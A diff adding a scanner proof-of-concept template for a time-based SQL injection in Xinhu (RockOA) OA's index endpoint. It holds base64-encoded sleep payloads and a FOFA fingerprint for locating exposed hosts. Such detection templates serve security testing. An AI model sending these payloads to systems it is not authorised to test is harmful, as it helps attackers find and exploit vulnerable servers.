@@ -1,0 +1,19 @@
+id: poc-yaml-rockoa-index-openmodhetong-sqli
+info:
+  name: 信呼OA系统index存在SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: xinhu
+  fofa: icon_hash="1652488516"
+requests:
+- method: GET
+  path: /index.php?m=openmodhetong|openapi&d=task&a=data&ajaxbool=0&nickName=MScgYW5kIHNsZWVwKDUpIw==
+  expression: "status_code == 200 && \ncontains(body,\"\\\"code\\\":200\") &&\ncontains(body,\"\
+    \\\"success\\\":true\") &&\nduration >= 5 &&\nduration <= 7 \n"
+- method: GET
+  path: /index.php?m=openmodhetong|openapi&d=task&a=data&ajaxbool=0&nickName=MScgYW5kIHNsZWVwKDcpIw==
+  expression: "status_code == 200 && \ncontains(body,\"\\\"code\\\":200\") &&\ncontains(body,\"\
+    \\\"success\\\":true\") &&\nduration >= 7 &&\nduration <= 9\n"
+variables: {}
+transport: http
